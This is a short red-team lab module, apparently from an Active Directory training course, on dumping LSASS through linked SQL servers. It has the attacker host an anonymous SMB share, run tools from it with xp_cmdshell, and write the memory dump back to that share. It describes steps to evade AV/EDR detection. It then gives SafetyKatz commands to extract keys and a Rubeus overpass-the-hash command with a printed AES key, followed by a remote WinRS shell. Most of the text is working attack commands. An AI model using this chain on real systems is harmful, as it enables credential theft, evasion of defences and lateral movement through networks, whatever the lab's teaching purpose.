# LSASS Dump

This module will cover another way other than reverse shell to get access to SQL server. This will follow safe ways to dump **LSASS** which will bypass AV or EDR.&#x20;

There are multiple ways to download tools into the victim machine. These are&#x20;

* **HTTP**(s) - detected by EDR
* **Binaries** intended for download like msedge.exe - Not detected but need to store the dump into the victim machine
* **SMB** - Not detected and user friendly cause tools can be directly loaded from the share and the dump can be stored directly to the share.

Make sure to create a share from the attacker machine following the below steps.

* Adding `Everyone`, `Guest` and `ANONYMOUS LOGON` to the permissions of the share.
* Open the _Local_ _Group Policy Editor_ (e.g. by running `gpedit.msc`)
  * Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options
  * **Accounts: Guest account status:** `Enabled`
  * **Network access: Let Everyone permissions apply to anonymous users:** `Enabled`
  * **Network access: Restrict anonymous access to Named Pipes and Shares:** `Disabled`
  * **Network access: Shares that can be accessed anonymously:** `YOUR_SHARE_NAME`

```powershell
# Get the LSASS process ID
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\DCORP-STDx.dollarcorp.moneycorp.local\sqlshared\FindLSASSPID.exe''' -QueryTarget eu-sql32

# Break the detection chain
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'SELECT @@version' -QueryTarget eu-sql32

# Dump the LSASS
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\DCORP-STDx.dollarcorp.moneycorp.local\sqlshared\minidumpdotnet.exe <process_id> \\DCORP-STDx.dollarcorp.moneycorp.local\sqlshared\heyu.dmp''' -QueryTarget eu-sql32
```

Extract the credentials from the dump

```batch
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::minidump C:\AD\Tools\sqlshared\something.dmp" "sekurlsa::evasive-keys" "exit"

:: OPTH to get access
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

:: Test the connection
winrs -r:eu-sql32.eu.eurocorp.local cmd
```
